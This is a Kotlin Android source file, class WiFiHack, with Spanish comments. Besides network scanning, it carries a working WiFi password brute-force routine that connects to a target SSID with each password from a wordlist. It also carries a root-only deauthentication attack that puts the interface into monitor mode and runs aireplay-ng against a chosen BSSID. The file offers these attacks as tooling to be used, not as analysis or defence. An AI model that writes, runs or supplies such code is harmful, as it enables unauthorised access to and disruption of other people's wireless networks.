package com.industrialble.network

import android.content.Context
import android.net.wifi.ScanResult
import android.net.wifi.WifiConfiguration
import android.net.wifi.WifiManager
import android.os.Build
import com.industrialble.tools.RootChecker

/**
 * Módulo WiFi: escaneo, deauth (root) y fuerza bruta.
 */
class WiFiHack(private val context: Context) {

    private val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as WifiManager

    data class WiFiNetwork(
        val ssid: String,
        val bssid: String,
        val level: Int,
        val frequency: Int,
        val capabilities: String,
        val encryption: String = "",
        val channel: Int = 0
    )

    /** Escanea redes WiFi disponibles */
    fun scanNetworks(): List<WiFiNetwork> {
        if (!wifiManager.isWifiEnabled) return emptyList()

        return try {
            val results = wifiManager.scanResults
            results
                .distinctBy { it.BSSID }
                .map { result ->
                    WiFiNetwork(
                        ssid = result.SSID,
                        bssid = result.BSSID,
                        level = result.level,
                        frequency = result.frequency,
                        capabilities = result.capabilities,
                        encryption = detectEncryption(result),
                        channel = freqToChannel(result.frequency)
                    )
                }
                .sortedByDescending { it.level }
        } catch (_: Exception) { emptyList() }
    }

    /** Inicia un escaneo y devuelve los resultados */
    fun startScan(): Boolean {
        return try {
            wifiManager.startScan()
        } catch (_: Exception) { false }
    }

    /** Devuelve las redes guardadas en el dispositivo */
    fun getSavedNetworks(): List<String> {
        return try {
            wifiManager.configuredNetworks.map { it.SSID }
        } catch (_: Exception) { emptyList() }
    }

    /**
     * Fuerza bruta WiFi: intenta conectarse con cada contraseña de la wordlist.
     * Funciona sin root (usa WifiManager API).
     */
    @Suppress("DEPRECATION")
    fun bruteForce(
        ssid: String,
        passwords: List<String>,
        onProgress: (Int, Int, String) -> Unit,
        onFound: (String) -> Unit,
        onFinish: (Boolean) -> Unit
    ) {
        Thread {
            val cleanSsid = "\"${ssid.removeSurrounding("\"")}\""

            for ((index, password) in passwords.withIndex()) {
                onProgress(index + 1, passwords.size, password)

                try {
                    val config = WifiConfiguration().apply {
                        SSID = cleanSsid
                        allowedKeyManagement.set(WifiConfiguration.KeyMgmt.NONE)

                        // WPA/WPA2
                        if (password.isNotEmpty()) {
                            preSharedKey = "\"$password\""
                            allowedKeyManagement.set(WifiConfiguration.KeyMgmt.WPA_PSK)
                        }
                    }

                    val netId = wifiManager.addNetwork(config)
                    if (netId != -1) {
                        wifiManager.disconnect()
                        val enabled = wifiManager.enableNetwork(netId, true)
                        if (enabled) {
                            // Esperar a que conecte
                            Thread.sleep(2000)
                            val info = wifiManager.connectionInfo
                            if (info != null && info.ssid == cleanSsid && info.networkId == netId) {
                                onFound(password)
                                onFinish(true)
                                return@Thread
                            }
                        }
                        // Eliminar la red después del intento
                        wifiManager.removeNetwork(netId)
                        wifiManager.saveConfiguration()
                        wifiManager.reconnect()
                    }
                } catch (_: Exception) {}
            }
            onFinish(false)
        }.start()
    }

    /**
     * Ataque deauth via root (requiere monitor mode + airoping-ng).
     * En la mayoría de smartphones NO funcionará sin kernel custom.
     */
    fun deauthAttack(bssid: String, interfaceName: String = "wlan0", onLog: (String) -> Unit) {
        Thread {
            onLog("🔴 Verificando root...")
            val root = RootChecker.check(context)
            if (!root.isRooted) {
                onLog("❌ Se requiere root para deauth attack")
                return@Thread
            }

            onLog("📡 Preparando interfaz $interfaceName...")
            // Intentar poner la interfaz en modo monitor (generalmente falla en smartphones)
            RootChecker.execRootCommand("ip link set $interfaceName down")
            RootChecker.execRootCommand("iw dev $interfaceName set type monitor")
            RootChecker.execRootCommand("ip link set $interfaceName up")

            onLog("⚠️ Enviando deauth a $bssid...")
            RootChecker.execRootCommand("aireplay-ng -0 5 -a $bssid $interfaceName")

            onLog("🔧 Restaurando interfaz...")
            RootChecker.execRootCommand("ip link set $interfaceName down")
            RootChecker.execRootCommand("iw dev $interfaceName set type managed")
            RootChecker.execRootCommand("ip link set $interfaceName up")

            onLog("✅ Deauth completado")
        }.start()
    }

    private fun detectEncryption(result: ScanResult): String {
        val cap = result.capabilities
        return when {
            cap.contains("WPA3") -> "WPA3"
            cap.contains("WPA2") -> "WPA2"
            cap.contains("WPA") -> "WPA"
            cap.contains("WEP") -> "WEP"
            else -> "Abierta"
        }
    }

    private fun freqToChannel(freq: Int): Int {
        return when {
            freq in 2412..2484 -> (freq - 2412) / 5 + 1
            freq in 5170..5825 -> (freq - 5170) / 5 + 34
            else -> 0
        }
    }
}
